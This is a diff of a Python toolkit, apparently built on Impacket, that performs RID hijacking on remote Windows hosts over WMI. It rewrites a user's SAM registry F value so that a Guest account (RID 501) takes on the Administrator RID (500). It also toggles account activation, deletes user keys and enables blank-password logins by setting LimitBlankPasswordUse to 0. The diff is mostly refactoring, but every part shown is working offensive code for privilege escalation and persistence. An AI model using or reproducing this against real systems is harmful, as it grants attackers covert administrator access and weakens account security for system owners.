@@ -47,7 +47,7 @@ class RID_Hijack_Toolkit():
                     break
         iWbemServices.RemRelease()
 
-    def Permissions_Controller(self, action, hijack_Target):
+    def Permissions_Controller(self, action, user):
         exec_command = EXEC_COMMAND(self.iWbemLevel1Login)
         regini_Attr =[
             r'HKEY_LOCAL_MACHINE\SAM [1 17]',
@@ -55,7 +55,7 @@ class RID_Hijack_Toolkit():
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]',
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]',
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]',
-            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(hijack_Target)), 16), '08x'))
+            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(user)), 16), '08x'))
         ]
 
         if "retrieve" in action:
@@ -82,26 +82,28 @@ class RID_Hijack_Toolkit():
             exec_command.exec_command_silent(command=cmd)
 
     # Default is hijacking guest(RID=501) users to administrator(RID=500)
-    def hijack(self, action, hijack_Target, hijack_RID=None):
+    def hijack(self, action, user, hijack_RID=None, hostname=None):
         iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
         self.iWbemLevel1Login.RemRelease()
 
         iWbemServices2 = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
         StdRegProv, resp = iWbemServices2.GetObject("StdRegProv")
 
+        # Check user if it existed.
         try: 
-            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_UserAccount where SID like "%-{}"'.format(hijack_Target))
+            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_UserAccount where SID like "%-{}"'.format(user))
             Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
         except Exception as e:
             if "WBEM_S_FALSE" in str(e):
-                print("[-] User with RID: %s not found!"%hijack_Target)
+                print("[-] User with RID: %s not found!"%user)
             else:
                 print("[-] Unexpected error: %s"%str(e))
             self.dcom.disconnect()
             sys.exit(0)
         
+        # Check permission first
         try:
-            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F')
+            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), 'F')
             len(raw_value.uValue)
         except Exception as e:
             if "NoneType" in str(e):
@@ -110,7 +112,12 @@ class RID_Hijack_Toolkit():
                 print('[-] Unknown error: %s'%(str(e)))
             iWbemServices.RemRelease()
         else:
-            if action != "remove":
+            if action == "remove":
+                print("[+] Remove user.")
+                StdRegProv.DeleteKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')))
+            elif action == "backup":
+                self.backup_UserProfile(user, hostname, StdRegProv)
+            else:
                 # Impacket will return native integer list like this:
                 # [3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255,255, 255, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 245, 1, 0, 0, 1, 2, 0, 0, 20, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 52, 0, 52, 0, 0, 0]
                 #
@@ -135,7 +142,7 @@ class RID_Hijack_Toolkit():
                 # Index 12 is rid
                 if action == "hijack":
                     result[12] = int(hijack_RID)
-                    print('[+] Hijacking user from RID: %s to RID: %s'%(hijack_Target, hijack_RID))
+                    print('[+] Hijacking user from RID: %s to RID: %s'%(user, hijack_RID))
 
                 # Enable user index 14 = 532, disable is 533
                 elif action == "activate":
@@ -145,39 +152,23 @@ class RID_Hijack_Toolkit():
                     result[14] = 533
                     print("[+] Deactivate target user.")
                 
-                StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F', result)
-                
-            else:
-                print("[+] Remove user.")
-                StdRegProv.DeleteKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')))
+                StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), 'F', result)
             
             iWbemServices.RemRelease()
 
-    # For Guest user
-    def BlankPasswordLogin(self, action):
-        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
-        self.iWbemLevel1Login.RemRelease()
-        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
-        if action == "enable":
-            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 0)
-            print("[+] Enable blank password login.")
-        elif action == "disable":
-            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 1)
-            print('[+] Disable blank password login.')
-        iWbemServices.RemRelease()
-
-    def backup_UserProfile(self, rid, hostname):
-        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
-        self.iWbemLevel1Login.RemRelease()
-        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
-        value_Name = StdRegProv.EnumValues(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(rid)), 16), '08x')))
+    def backup_UserProfile(self, user, hostname, StdRegProv=None):
+        if StdRegProv is None:
+            iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
+            self.iWbemLevel1Login.RemRelease()
+            StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
+        value_Name = StdRegProv.EnumValues(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')))
         backup_Dict = {
-            'user-RID':int(rid),
+            'user-RID':int(user),
             'key-Value':[]
         }
         for valueName in value_Name.sNames:
             value_Dict = {}
-            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(rid)), 16), '08x')), valueName)
+            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), valueName)
             raw_value_length = len(raw_value.uValue)
             raw_value = numpy.array_split(raw_value.uValue, (raw_value_length / 4))
             result=[]
@@ -198,7 +189,7 @@ class RID_Hijack_Toolkit():
             # Save to final dict
             backup_Dict['key-Value'].append(value_Dict)
         
-        self.save_ToFile(hostname, rid, json.dumps(backup_Dict, indent=4))
+        self.save_ToFile(hostname, user, json.dumps(backup_Dict, indent=4))
 
     def restore_UserProfile(self, file):
         with open(file) as json_Data:
@@ -211,3 +202,16 @@ class RID_Hijack_Toolkit():
             StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(data['user-RID'])), 16), '08x')), i['valueName'], i['data'])
 
         print("[+] User with RID:{} restore successful!".format(data['user-RID']))
+
+    # For Guest user
+    def BlankPasswordLogin(self, action):
+        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
+        self.iWbemLevel1Login.RemRelease()
+        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
+        if action == "enable":
+            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 0)
+            print("[+] Enable blank password login.")
+        elif action == "disable":
+            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 1)
+            print('[+] Disable blank password login.')
+        iWbemServices.RemRelease()
